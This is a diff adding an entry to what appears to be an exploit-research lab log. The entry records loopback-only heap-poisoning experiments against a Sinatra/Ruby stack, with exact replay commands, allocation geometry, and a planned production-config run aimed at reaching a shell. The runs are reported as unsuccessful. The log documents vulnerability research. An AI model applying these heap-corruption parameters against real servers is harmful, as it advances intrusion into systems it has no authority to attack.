@@ -17028,3 +17028,56 @@ not the survey bytes: the useful ASLR-stable target is UNKNOWN, no static
 fake GCObject chain exists and the chosen zero `.bss` walk terminates. Grade
 unchanged, no r5. Recipes and hashes: `lab/frontier/rpm2shell/PROVENANCE.md`
 § W310 and `reports/frontier-rpm2shell.md` § "Embedded-path length".
+
+## 2026-11-27 03:4xZ — W311 stock-Sinatra claim-consumer arms (Ruby)
+
+Result and limits: `reports/ruby2shell-investigation.md` §03:4xZ. All runs
+are loopback-only, analysis instrumentation; raw traces are gitignored under
+`lab/build/evidence/` and regenerate with the commands below. The one-line
+wall command that omitted `RUBY2SHELL_CLAIM_MODE=poison`,
+`FILLER_SPEC=1x1200` and the forged claim list produced 12 aborted,
+off-geometry runs under tag `w311comp` — do not use it as evidence. The
+canonical exact-geometry replay (6/12 runs with B `0x401` → A `0x453`, tag
+`w311fine`) is:
+
+```
+RUBY2SHELL_CLAIM_STACK=sinatra RUBY2SHELL_CLAIM_MODE=poison \
+  RUBY2SHELL_CLAIM_N=972 RUBY2SHELL_CLAIM_TAG=w311fine \
+  RUBY2SHELL_CLAIM_DRAIN=984x7 RUBY2SHELL_CLAIM_PLANT=1000x6 \
+  FILLER_SPEC=1x1200 RUBY2SHELL_CLAIM_PARTS='1078@0x400:0x414,1015' \
+  RUBY2SHELL_CLAIM_COUNT=12 RUBY2SHELL_CLAIM_BINDUMPS=1 \
+  MTRACE_DUMP_BINS=1 MTRACE_DUMP_REQUEST=0x43f MTRACE_TID=1 \
+  POISON_GROWN=0x450 POISON_NEXT=0x91 \
+  bash lab/repro/ruby2shell-shrink-claim.sh
+```
+
+Targeted 0x480 consumer: same command with tag `w311cons480`,
+`RUBY2SHELL_CLAIM_PARTS='1120@0x400:0x414,1078@0x400:0x414,1015'`.
+Well-formed successor: tag `w311d2`, `POISON_NEXT=0x90`,
+`MTRACE_DUMP_RANGE=1 MTRACE_DUMP_RANGE_LOW=0x400
+MTRACE_DUMP_RANGE_HIGH=0x460`, `COUNT=6`. Large-class consumer: tag
+`w311big603`, `POISON_NEXT=0x90`, parts
+`'1539@0x400:0x414,1078@0x400:0x414,1015'`, `COUNT=8`. Arena-size-word
+arms use the analysis-only `lab/build/w311-{arenaflag.c,ruby-wrap.sh}`
+(gitignored): the wrapper exports `W311_ARENA_REQ=0x43f` and preloads
+`w311-arenaflag.so` ahead of mtrace; tags `w311arena` (default) and
+`w311arena1` (`MALLOC_ARENA_MAX=1`). The unsorted-link dump is an opt-in copy
+(`lab/build/w311-mtrace.c` → `w311-mtrace.so`, `W311_VCHAIN=1`), tags
+`w311vchain`/`w311head`; `head+8 == 0x401` in `w311head-1` marks a bad
+boot-derived arena head, so only `w311head-2`'s chain is interpretable.
+
+Every arm above returned zero claim pops at the exact geometry. Named next
+experiment (still open from report §3231): production-config `0x400` pop
+without mtrace in the request path, with safe and fixed controls before any
+impact reading:
+
+```
+RACK_ENV=production RUBY2SHELL_CLAIM_STACK=sinatra \
+  RUBY2SHELL_CLAIM_MODE=poison RUBY2SHELL_CLAIM_N=972 \
+  RUBY2SHELL_CLAIM_TAG=w312prod400 RUBY2SHELL_CLAIM_DRAIN=984x7 \
+  RUBY2SHELL_CLAIM_PLANT=1000x6 FILLER_SPEC=1x1200 \
+  RUBY2SHELL_CLAIM_PARTS='1024@0x400:0x414,1015' \
+  RUBY2SHELL_CLAIM_COUNT=12 RUBY2SHELL_CLAIM_NO_MTRACE=1 \
+  POISON_GROWN=0x450 POISON_NEXT=0x90 \
+  bash lab/repro/ruby2shell-shrink-claim.sh
+```
